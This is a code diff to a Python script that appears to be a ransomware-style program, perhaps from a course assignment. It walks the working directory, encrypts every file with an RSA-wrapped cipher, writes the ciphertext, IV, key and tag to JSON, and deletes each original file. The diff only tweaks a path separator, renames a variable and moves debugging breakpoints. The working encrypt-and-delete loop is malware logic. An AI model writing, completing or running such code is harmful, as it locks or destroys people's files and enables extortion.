@@ -7,7 +7,7 @@ if __name__ == '__main__':
     #Retrieves the path to the current location of this file
     curr_path = os.getcwd()
     #Force python to skip the python cache folder
-    skip_folder = '\__pycache__'
+    skip_folder = '/__pycache__'
     #Force python to remove these list of items from the root folder directory
     #Because it is our code
     for root, dirs, files in os.walk('.'):
@@ -24,11 +24,13 @@ if __name__ == '__main__':
             #file_to_encrypt is the absolute path to the file
             file_path = curr_path + curr_folder + "/" + files[i]
             #Generate cipher text, IV, Key, and file extension
-            encoded_cipher, encoded_IV, encoded_key, ext, file, tag = enc.MyRSAEncrypt(file_path)
-            pdb.set_trace()
+            print(file_path)
+            encoded_cipher, encoded_IV, encoded_key, ext, file, encoded_tag = enc.MyRSAEncrypt(file_path)
+            # pdb.set_trace()
             #Stringify the following list
-            cipher, IV, key, tag = enc.stringify([encoded_cipher, encoded_IV, encoded_key, tag])
+            cipher, IV, key, tag = enc.stringify([encoded_cipher, encoded_IV, encoded_key, encoded_tag])
             #Generate map
+            pdb.set_trace()
             item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext, 'tag' : tag}
             #Generate Json
             dump = json.dumps(item_map)
@@ -36,6 +38,3 @@ if __name__ == '__main__':
             f.write(dump)
             os.remove(file_path)
     exit()
-            
-            
-            
